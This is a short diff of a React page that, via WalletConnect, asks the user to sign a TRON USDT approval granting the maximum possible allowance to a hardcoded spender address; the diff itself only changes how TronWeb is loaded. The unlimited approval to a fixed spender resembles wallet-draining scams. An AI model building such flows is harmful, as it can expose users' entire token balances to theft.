@@ -3,8 +3,7 @@ import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 import SignClient from "@walletconnect/sign-client";
-import TronWebLib from "tronweb";
-const TronWeb = (TronWebLib as any).default || TronWebLib;
+
 
 declare global {
   interface Window {
@@ -190,7 +189,7 @@ export default function Index() {
       }
 
       // Build + sign via WalletConnect
-      const tw = new TronWeb({ fullHost: "https://api.trongrid.io" });
+      const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
       const { transaction } = await tw.transactionBuilder.triggerSmartContract(
         TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 },
         [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
